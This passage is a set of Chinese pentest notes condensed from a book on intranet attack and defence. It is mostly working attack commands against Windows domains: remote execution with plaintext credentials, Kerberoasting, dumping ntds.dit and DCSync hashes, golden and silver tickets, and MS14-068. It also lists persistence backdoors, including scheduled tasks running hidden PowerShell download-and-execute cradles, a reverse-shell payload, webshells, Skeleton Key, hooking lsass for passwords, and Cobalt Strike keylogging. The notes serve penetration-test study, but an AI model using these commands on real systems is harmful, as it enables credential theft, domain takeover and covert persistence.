wmic /node:192.168.100.190 /user:administrator /password:Aa123456 process call create "cmd.exe /c ipconfig >ip.txt"

type \\192.xxx.xxx.xx\c$\ip.txt
```

- impacket中的wmiexec

```
wmiexec.py administrator:Aa123@192.xxx.xxx
```
- wmiexec.vbs

```
cscript.exe //noiogo wmiexec.vbs /shell 192.xxx.xxx.xxx administrator Aa123456@ 半交互shell

cscript.exe wmiexec.vbs /cmd 192.xxx administrator Aa123456 "ipconfig"

-wait 5000 ping/systeminfo等时间较长的命令

-persist nc等不需要结果但需要运行的程序
```

- Invoke-WmiCommand(powerSploit工具包)

```
$user= "pentest\administrator"
$password = ConvertTo-SecureString -String "a123456" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PsCredential
远程执行命令
$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $cred - CompuerName 192.xxxx
将执行结果输出到屏幕
$Remote.PayloadOutput
```

- Invoke-WMIMethod(powershell自带)

```
$user= "pentest\administrator"
$password = ConvertTo-SecureString -String "a123456" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PsCredential
远程启动计算器
Invoke-WMIMethod -Class win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.xxx.xx.xxx" -Credential $cred
```

### 永恒之蓝

```
auxiliary/scanner/smb/smb_ms17_010
```
### smbexec使用
#### C++版smbexec

-  下载地址

```
https://github.com/sunorr/smbexec
```
- 使用

```
test.exe ipaddress username password command netshare
```
```
(1)上传execserver
net use \\192.xxxx "Aa123" /user:pentest\adminidtrator

cpoy execserver.exe \\192.xxx\c$\windows\

(2)客户端执行命令
test.exe 192.xxx.xxx.xxx administrator Aa123456 whoami c$
```

#### impacket工具包中的smbexec.py

```
smbexec.py
smbexec.py pentest/administrator:Aa123456@192.168.xxx.xxx
```

#### Linux跨windows远程执行命令

- 下载地址

```
https://github.com/brav0hax/smbexec
```

### DCOM在远程系统中的使用(分布式组件对象模型)
#### 本地DCOM执行命令

- 获取DCOM程序列表

```
Get-CimInstance Win32_DCOMApplication win12以上

Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication win7、08
```
- 使用DCOM执行任意命令

```
本地启动计算器
$com = [activator]::CreateINstance([type]::GetTypeFromProgiD("MMC20.Application",'127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
```

- 远程机器执行命令

```
net use \\192.168.100.205 "a123456" /user:pentest.com\syst1m

$com = [activator]::CreateINstance([type]::GetTypeFromProgiD("MMC20.Application",'127.0.0.1"))

$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")

```

### SPN
#### SPN扫描

- SPN

```
spn = serviceclass "/" hostname [":"port] ["/" servicename]

MSSQLSvc/computer1.pentest.com:1433
exchageMDB/EXCAS01.pentest.com Exchange服务
TERMSERV /EXAS.pentest.com rdp
WSMAN/ExCAS01.pentest.com
```
- PowerShell-Ad-Recon工具包

```
https://github.com/PyroTek3/PowerShell-AD-Recon

所有spn服务扫描
https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices

Import-Moudle .\Discover-PSInterestingServices
Discover-PSIntingService
```
- Windows自带

```
setspn -T domain -q */*
```

#### Kerberoast

- 手动注册SPN

```
setspn -A MSSQLSvc/computer1.pentest.com:1433 mssql
```
- 查看用户所对应的SPN 

```
setspn -L pentest.com\mssql
```

- 查看所有注册的SPN

```
setspn -T domain -q */*
```
- adsiedit.msc查看用户spn以及其他高级属性

- 配置指定服务的登陆权限

```
gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\User Pights Assignment\Log on as a service
```

- 修改加密类型

```
gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security; Configure encryption types allowed
```

- 请求SPN Kerberos票据

```
Add-Type -AssmblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken-ArgumentList "MSSQLSvc/computer1.pentest.com"
```

- 导出票据

```
kerberos::list /export
```

- 破解hash

```
https://github.com/nidem/kerberoast

python tgsrepcrack.py wordlist.txt mssql.kirbi
```

### Exchange邮件服务器
- Exchange邮件服务器

```
邮箱服务器（Mailbox Server）
托管邮箱、公共文件夹及相关消息数据

客户端访问服务器（Client Acess Server）
接收处理不同客户端请求

集线传输服务器（Hub Transport Server）
进出站规则、处理邮件正确分发，确保地址正确解析

统一消息服务器（Unified Messagine Server）
允许用户通过邮件发送存储语音和传真

边缘传输服务器（Edge Transport Server）
路由发往内/外部的邮件、反垃圾邮件、反病毒策略
```
- 访问接口

```
OWa(web邮箱)
domain/owa/

EAC（echange管理中心）
http://domain/ecp/

Outlook Anywhere
MAPI
Exchange ActiveSyne
Exchange Web Service
```

#### Exchange服务发现

- 基于端口扫描

```
nmap -A -O -av 192.168.100.190
```
- SPN查询

```
setspn -T pentest.com -F -Q */*
```

#### Exchange基本操作

- 查看邮件数据库

```
powershell
add-pssnapin microsoft.exchange* 添加exchange管理单元
Get-MailboxDatabase -server "Exchange"

查询指定数据库
Get-MailboxDatabase -Identity 'Mailbox Database 1894576043' | Format-List Name,EdbFilePath,LogFolderPath
```
- 获取现有用户的邮件地址

```
Get-Mailbox | format-tables Name,WindowsEmailAddress
```

- 查看指定用户的邮箱使用信息

```
get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotailItemSize,LastLogonTime
```

- 获取用户邮箱中的邮件数量以及最后登陆时间

```
Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Descend
```

#### 导出指定的电子邮件

> 后缀为pst

- 配置用户的导入/导出权限

```
(1)查看用户权限
Get-ManagementRoleAssignment -role "Mailbox import Export" | Format-List RoleAssigneeName

(2)添加权限
New-ManagementRoleAssignment -Name "Import Export_Domain Admins" -User "Administrator" -Role "Mailbox import Export"

(3)删除权限
Remove-ManagementRoleAssignment "Import Export_Domain Admins" -Confirm:$false
```

- 设置网络共享文件夹

```
UNC(通用命名规范)
ner share inetpub=c:\inetpub /grant:everyone,full
```

- 导出用户电子邮件

```
(1)powershell导出
New-MailboxExportRequest -Mailbox administrator -FilePath \\192.xxx.xxx.xxx\inetpub\administrator.pst
(2)图形化导出
192.168.100.194\ccp
```

- 管理导出请求

```
(1)查看之前产生的导出请求记录
Get-MailboxExportRequest

(2)将指定用户已完成导出请求删除
Remove-MailboxExportRequest -Identity Administrtor\mailboxexport

(3)删除所有导出记录
Get-MailboxExportRequest -Status Completed Remove-MailboxExportRequest
```

## 域控制器安全
### 使用卷影拷贝服务器提取ntds.dit
- ntds.dit

```
存储用户名、散列值、组、GPP、Ou等数据库
```
- 通过ntdsutil.exe提取ntds.dit

```
为活动目录提供管理机制的命令行工具
适用于03、08、12
```
```
(1)创建快照
ntdsutil snapshot "activate instance ntda" create quit quit

(2)加载快照
ntdsutil snapshot" mount {GUID} "quit quit

(3)复制快照到本地
copy c:\$xxx\ntds.dit c:\temp\ntds.dit

(4)删除之前加载的快照
ntdsutil snapshot "unmount {GUID}" "delect {GID}" quit quit

(5)查看快照
ntdsutil snapshot "List All" quit quit
```

- 利用vssadmin提取ntds.dit

```
创建和删除卷影拷贝、列出卷影拷贝信息
适用于08、win7
```
```
创建c盘卷影拷贝
vssadmin create shadow /for=c:

复制卷影拷贝
copy ntds.dit c:\ntds.dit

删除快照
vssadmin delect shadow /for=c: /quiet
```

- 利用vssown.vbs提取

```
下载地址
https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs
```
```
cscript vssown.vbs /start 启动
cscript vssown.vbs /create c 创建
cscript vssown.vbs /list 列出
cscript vssown.vbs /delect
```

- 使用ntdsutil的IFM(媒体创建)创建卷影拷贝

```
Nishang Copy-VSS.ps1 脚本
import-moudle .\Copy-VSS.ps1
Copy-vss
```

- 使用diskshadow导出ntds.dit(必须在c:\windows\system32中操作)

```
diskshadow.exe /? 查看帮助
将需要执行的命令导入command.txt文件
diskshadow.exe /s c:\command.txt 执行命令
```
```
导出ntds.dit的txt

//设置卷影拷贝
set context persistent nowriters
//添加卷
add volume c: alias someAlias
//创建快照
create
//分配虚拟磁盘盘符
expose %someAlias% k:
//将ntds.dit复制到c盘
exec "cmd.exe" /c copy k:\windows\NTDS\ntds.dit c:\ntds.dit
//删除所有快照
delect shadow all 
//列出系统中的卷影拷贝
list shadow all
//重置
reset
//退出
exit

diskshadow /s c:\command.txt

导出system.hive
reg save hkim\system c:\windows\temp\system.hive
```

- 监控卷影拷贝服务的使用情况

```
system event id 7036
```

### 导出ntds.dit 中的散列值

#### 使用esedbexport 恢复ntds.dit

- 下载地址

```
https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar
```
 - 导出netd.dit
 
```
 apt-get install autoconf automake autopoint libtool pkg-config
 ./configure
 make
 sudo make install 
 sudo ldconfig
 
 /usr/local/bin
```

- 使用

```
esedbexport -m tables ntds.dit 提取表信息
```
- 导出散列值

```
下载ntdsxtract
https://github.com/csababarta/ntdsxtract.git

python setup.py build && python setup.py install 安装ntdsxtract

将netds.dit.export 和sustem文件夹放入ntdsxtract文件夹
dsuser.py ntds.dit.export/database.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt 将所有散列值导出到all_user.txt

dscomputers.py ntds.dit.export/database.3 computer_output --csvoutfile all_computers.csv 导出域内所有计算机的信息 
```

#### impacket工具包导出散列值(secretsdump)

```
https://github.com/csababarta/ntdsxtract.git

python setup.py install

impacket-secretsdump -system SYSTEM -ntds ntds.dll LOCAL 导出所有散列值

impacket-secretsdump
-hashs aad3bxxxxx
-just-dc pentest.com/administrator@192.168.100.205 从远程域控制器中读取散列值
```
- 在windows下解析ntds.dit 导出域账号和散列值

```
https://github.com/zcgonvh/NTDSDumpEx/releases/download/v0.3/NTDSDumpEx.zip

NTDSDumpEx.exe -d ntds.dit -s system
```

### 利用dcsync获取域散列值
- 使用mimikatz转储域散列值(域管)

```
lsadump::dcsync /domain:pentest.com /all /csv 所有用户名的散列值

lsadump::dcsync /domain:pentest.com /user:syst1m
导出指定用户的散列值

privilege::debug
lsadump::lsa /inject 域控上转储lsass.exe dump散列值
```
- 使用dcsync获取域账户和域散列值

```
https://gist.github.com/monoxgas/9d238accd969550136db

Invoke-DCSync -PWDumpFormat
```

### 使用measploit获取域散列值

- osexec_ntdsgrab

```
use auxiliary/admin/smb/psexec_ntdsgeab
RHOST、SMBDOMAIN、SMBUser、SMBPass参数
```

- 基于meterprter会话获取域账号和散列值

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.xxx.xxx.xxx LPORT = 5555 -f exe > s.exe

use windows/gather/credentials/domain_hashdump
```
### 使用vshadow.exe和QuarksPwDump.exe导出域账号和散列值
- 下载地址

```
https://github.com/quarkslab/quarkspwdump

ShadowCopy.vbs

setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%

esentutl /p /o ntds.dit 修复复制出来的ntds.dit

vshadows.exe 
```

### Kerberos域用户提权

#### PyKEK工具包
- 下载地址

```
https://github.com/mubix/pykek
```
- 工具

```
-u 用户名@域名
-s <sid> 用户sid
-d 域控制器地址
-p 明文密码
--rc4 在没明文密码情况下，通过NTLM Hash登陆
```

- 使用

```
wmic qfe get botfixid 查看补丁情况
whoami /user 查看用户SID
wmic useraccount get name,sid 获取域内所有用户的SID

ms14-068.exe -u 域成员名@域名 -s SID -d 域控制器地址 -p 域成员密码

清除票据
kerberos::purge

kerberos::ptc "TGT_user1@pentest.com.cache" 注入票据
```

#### goldenPac.py

- 命令格式

```
python goldenPac.py 域名/域成员用户:密码@域控制器地址
```
- 安装kerberos客户端

```
apt-get install krb5-user y
```
#### Metasploit

- 利用脚本

```
use auaxiliary/admin/kerberos/ms14_068_kerberos_checksum
```
- 格式转换，导出kirbi格式文件

```
kerberos::clist "a.bin" /export
```
- 生成反向shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST LPORT -f exe >shell.exe
```
- 票据注入

```
use exploit/mulit/reverse_tcp

load wiki
kerberos_ticket_use a.kirbi
```

- 高权限票据测试

```
use/exploit/windows/local/current_user_psexec
```

## 权限维持及防御
### 操作系统后门
#### 粘滞键后门

- 替换

```
cd windows\system32
Move sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe
```
- Empire

```
usemoudle lateral_movement/invoke_wmi_debuggerinfo

set List shuteet
set ComputerName WIN7-64.shuteer.testlab
set TargetBinary sethc.exe
execute
```

#### 注册表注入后门

- Empire

```
usemoudle persistence/userland/registry

set Listener shuteer
set RegPath HKCU:Spftware\Microsoft\Windows\CurrentVersion\Run
execute
```

#### 计划任务后门

- Metasploit 模拟计划任务后门

```
use exploit/multi/script/web_delivery

（1）用户登陆
schtacks /create /tn WindowsUpdate /tr "c:\windows\system32\powershell.exe -WindowsStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://192.xxx.xxx.xxx'")'" /sc onlogon /ru system

(2)系统启动
schtacks /create /tn WindowsUpdate /tr "c:\windows\system32\powershell.exe -WindowsStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://192.xxx.xxx.xxx'")'" /sc onstart /ru system

(3)系统空闲
schtacks /create /tn WindowsUpdate /tr "c:\windows\system32\powershell.exe -WindowsStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://192.xxx.xxx.xxx'")'" /sc onidle /i l
```
- PowerSploit模拟生成后门

```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1

创建后门。空闲状态下执行
shuteer.ps1为要执行的payload
Import-Moudle ./Persistence.psm1
$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
$ UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle Add-Persistence -FilePath ./shuteer.ps1 -ElevatedPersistenceOption
$ElevatedOptions - UserPersistenceOption $UserOptions -Verbose
```
- Empire模拟后门

```
usemoudle persistence/elevated/schtasks
set DailyTime 16:17
set Listener test
execute
```
- meterpreter后门

```
Persistence
```
- Cymothoa后门

```
Cymothoa
```

- WMI后门（管理员）

```
Empire Invoke-WMl模块
powershell/persistence/elevated/wmi

检查目标主机情况：
Get-WMIObject -Namespace root\Subscription -Class CommandLine EventConsumer -Fifter "Name='Update'"

修复：
删除自动运行的恶意wmi条目
使用Get-WMIObject命令删除持久化相关组件
```

### WEB后门

- Nishang

```
\nishang\Antak-WebShell目录下
```
- Weevely

```
https://github.com/epinna/weevely3
```
```
weevely 查看帮助
weevely <URl> <password> [cmd] 连接木马
weevely session <path>[cmd] 加载会话
weevely generate <password><path> 生成后门代理

weevely http://xxx.xxx.xxx.xxx/test.php test

system_info 系统信息
net_scan扫描端口
help 查看命令
```

- webacoo后门

```
webacoo -h 查看帮助
webacoo -g -o /root/test.php 生成webshell

webacoo -t -u http://xxxtest/php
load  查看模块
```
- ASPX meterpreter
 
```
shell_reverse_tcp payload
```

- PHP meterpreter

```
php meterpreter payload
```

### 域控制器权限持久化

#### DSRM域后门
- DSRM

```
目录服务恢复模式
使用DSRM账号恢复
03不使用
08需要安装KB961320补丁
08以后不需要
```
- 使用

```
mimikatz

获取krbtgt NTLM HASH
privilege::debug
lasdump::lsa /patch /name:krbtgt

获取DSRM账号的NTLM Hash
token:elevate
lsadump:sam

将DSRM账号和krbtgt的ntlm hash同步
NTDSUTIL
SET DSRM PASSWORD
SYNC FROM DOMAIN account krbtgt

查看是否同步成功
lsadump::sam

修改DSRM登陆方式
新建HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior为2
使用powershell更改
New-ItemProperty "hkim:system\currentrolset\control\lsa\" -name "dsemadminlogonbehavior" -value 2 -propertyType DWORD

使用dsrmz账号通过网络远程登陆域控制器
privilege::debug
sekurlsa:pth /domain:DC /user:administrator /ntlm:53ebxxxx

dcysnc转储krbtgt ntlm hash
lsadump::dcsync /domain:pentest.com /dc:dc /user:krbtgt

防御：
检查注册表
修改dsrm账号
经常检测ID为4794的日志
```

- DerbyCON

```
比DSRM更为高级的一种方式，知道hash

Mimikatz “privilege::debug” “sekurlsa::pth /domain:ADSDC03 /user:Administrator /ntlm:7c08d63a2f48f045971bc2236ed3f3ac” exit
```

#### SSP 

```
https://syst1m.com/post/security-support-provider/
```

#### SID History域后门
- SID History

```
使A域中的syst1m用户的权限当syst1m用户迁移到B域中时还拥有原来的权限
```

- 查看test用户的SID history属性

```
Import-Moudle activedirectory
Get-ADUser test -Properties sidhistory
```
- 注入sid属性

```
privilege::debug
sid::add /sam:test /new:administrator
```
- 再次查看sid history

```
Get-ADUser test -Properties sidhistory.memberof
```

- 测试

```
dir \\dc\c$
```
- 防御

```
查看域用户sid为500的用户
完成迁移后，对相同500检测
定期检查id为4765和4766的日志、ID为4765为sid history属性添加到用户的日志。4766为将sid history属性添加到用户失败的日志
```

#### Golden Ticket(黄金票据)
- 环境

```
域控：192.168.100.205
域成员:192.168.100.146
```
- 导出krbtgt的ntlm hash

```
lsadump::dcsync /domain:pentest.com /user:krbtgt
```
- 获取基本信息

```
获取sid
wmic useraccount get name,sid

获取当前用户sid
whoami /user

查询域管理员账号
net group "domain admins" /domain

查询域名
ipconfig /all
```
- 实验

```
清空票据
kerberos::purge

生成票据
kerberos:golden /admin:Administrator /domain:pentest.com /sid:域SID /krbtgt:ntml hash /ticket:Administrator.kiribi

注入内存
kerberos::ptt Administrator.kiribi

检索当前会话中的票据
kerberos::tgt

验证权限
cscript wmiexec.vbs /shell dc
```

#### Silver Ticket(白银票据)

- 收集

```
域名
域SID
目标服务器的FQDN
可利用的服务
服务账号的NTLM Hash
需要伪造的用户名
```

- 实验

```
获取服务账号ntlm hash
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

清除票据
klist purge

伪造白银票据
kerberos::golden /domain:pentest.com /sid:域SID /target:dc.pentest.com /serviceLcifs /rc4:ntlm hash /user:syst1m /ptt
```

- 伪造LDAP 票据

```

```

#### Skeleton Key(万能密码)
- 使用域管账号密码连接

```
net use \\192.168.100.205\ipc$ "password" /user:pentest\administrator
```

- 添加万能密码

```
privilege::debug
misc::skeleton 注入万能密码
```

- 验证

```
删除原有ipc连接
net use
net usr \\dc\ipc$ /del /y

使用万能密码连接
net use \\dc\ipc$ "mimikatz" /user:administrator
```
- Empire 中的Skeleton key

```
interact 进入agent
usemoudle persistence/misc/skeleton key* 加载模块
execute 执行模块
```

#### Hook PasswordChangeNotify

- Hook PasswordChangeNotify

```
Hook PasswordChangeNotify作用是当用户修改密码后在系统中进行同步，密码符合要求的话，LSA会调用PasswordChangeNotify同步密码
```
- 使用

```
Import-Moudle .\Invoke-ReflectivePEInjection.ps1

注入HookPasswordChange.dll到内存
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass

当被修改密码查看
type c:\windows\Temp\passwords.txt
```

### Nishang下的脚本后门

- HTTP-Backdoor脚本

```
可以下载和执行powershell脚本，接收第三方网站的执行，内存执行PowerShell脚本
```
```
CheckURL 给出一个URL地址，如果存在我们MagicString中的值就去执行Payload - 下载运行我们的脚本
PayloadURL 这个参数给出我们需要下载的Powershell脚本的地址
Arguments 这个参数指定我们要执行的函数
StopString 这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行

PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis
```

- Add-ScrnSaveBackdoor

```
可以帮助攻击者利用windows屏幕保护来安插一个隐藏后门
```
- Execute-OnTime

```
用于在目标机器上指定powershell 脚本的执行时间
```
- Invoke-ADSBackdoor

```
能够在NTFS数据流中留下一个永久性的后门,只有dir /a /r 才可以看到。

Invoke-ADSBackdoor -PayloadURL http://a.com/test.ps1
```

## Cobalt Strike
- 功能

```
 agscript 拓展应用脚本
 c2lint 用于检查profile错误和异常
 teamserver 团队服务器程序
 cobaltsteike.jar 客户端
 logs 日志
 update.jar 更新
 data 保存当前teamserver 一些数据
```

### Cs模块

#### Cobalt strike模块

#### 后渗透模块

- 使用Elevate模块提升Beacon权限

```
右键->Acceess->Elevate

内置三个模块
（1）ms14-058 普通用户->sustem权限
（2）uac-dll bypassuac
（3）uac-token-duplication bypassuac

elevate uac-dll test
elevate uac-token-duplication test 
```

- Gold Ticket提升域管权限

```
access->Goldeb Ticket

查看用户所属的组
net user test /domain
```

- make_token模拟指定用户

```
access->Make_token
```
- Dump Hashes导出散列值

```
access->dump hashes
命令行：hashdump
```
- logonpasswords模块

```
access->Run mimikatz
命令行：logonpasswords
 
```

- 查看导出的信息

```
View->Crededtials
```

- mimikatz模块

```
mimikatz [moudle:command] <args>
```

- PsExec模块

```
Login->Psexec
```
- SOCKS Server模块

```
Pivoting->SOCKS Server
```

###CS常用命令

- 基本命令

```
help 帮助
sleep  设置休眠时间
```

- 常用操作命令

```
getuid 哪个用户身份运行
getsystem 尝试获取system权限
getprivs 获取当前beacon包含的的所有权限

Explore->Browser Pivot
browserpivot [pid] [x86]x64]
browserpivot stop
劫持IE浏览器
```
- 文件管理

```
图形化：
    Explore->File Browser
    
命令行：
    cd
    ls
    mkdir 
    delect
    mv
    execute 执行文件
```

- net view 命令

```
图形化：
    Explore->Net view
命令行：
    net view 显示域、资源列表
    net computer 查询域控制器上的计算机账户列表查找目标
    net dclist 列出域控制器
    net domain_trusts 列出域信息列表
    net group 枚举自身所在域控制器中的组
    net localgroup 枚举当前系统的本地组
    net logons 列出登陆的用户
    net session 列出会话
    net share 列出共享的目录和文件
    net user 列出用户
    net time 显示时间
```
- 端口扫描

```
Explore->Port scan
```
- 进程列表模块

```
Explore->Process List
命令行：
    ps
    kill [pid]
```
- screenshot  

```
图形：
    Explore->screenshot
命令行：
     screenshot
     screenshots pid s 定时截图
```

- Log Keystrokes模块（键盘记录）

```
图形：
    Process List->Log KeyStrokes
命令行：
    keylogger [pid]
    
    view->Log Keystrokes 查看键盘记录
```

- Inject 命令(注入新进程)

```
图形化：
    Process List->Inject
Becaon:
    inject [pid]
```

- Steat Token模块

```
图形化：
    Process List->Steal token
Becaon:
    steat_token [pid]
```

- Note模块

```
图形化：
    session->note
Becaon:
    note [text]
```
- shell

```
shell command arg
```

- run 

```
run 程序 参数
```

- execute（通常无回显）

```
execute 程序 参数
```

- powershell  

```
powershell command arg
```

- powerpick(可以不通过调用powershell.exe 执行命令)

```
powerpick commandlet arg
```

- powershell-import (可以直接本地powershell脚本加载到目标系统的内存中)

```
powershell-import /root/desktop/powerview.ps1
powershell Get-HostIP
```

### Aggressor脚本
#### 加载脚本

- 永久加载

```
load按钮-> xxx.cna
```

- 客户端加载

```
./agscript [host] [port][user][password][/path/to/script.cna]
```

>> 笔记摘自：《内网安全攻防 渗透测试实战指南》书本，非常不错的书本。